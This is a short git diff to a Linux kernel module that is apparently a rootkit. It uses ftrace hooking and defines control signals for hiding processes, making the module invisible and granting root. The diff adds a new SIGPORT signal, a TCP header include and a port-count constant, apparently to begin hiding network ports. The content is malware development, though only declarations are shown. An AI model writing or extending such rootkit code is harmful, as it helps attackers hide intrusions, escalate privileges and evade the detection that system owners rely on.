@@ -7,6 +7,7 @@
 #include <linux/module.h>
 #include <linux/slab.h>
 #include <linux/syscalls.h>
+#include <linux/tcp.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
@@ -15,6 +16,8 @@
 
 // comment this macro in real senary
 #define DEBUG
+
+#define MAX_TCP_PORTS 65535
 
 /*
  * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
@@ -151,11 +154,7 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
   for (i = 0; i < count; i++) fh_remove_hook(&hooks[i]);
 }
 
-enum {
-  SIGHIDE = 31,
-  SIGMODINVIS = 63,
-  SIGROOT = 64,
-};
+enum { SIGHIDE = 31, SIGMODINVIS = 63, SIGROOT = 64, SIGPORT = 62 };
 
 #ifndef IS_ENABLED
 #define IS_ENABLED(option) \
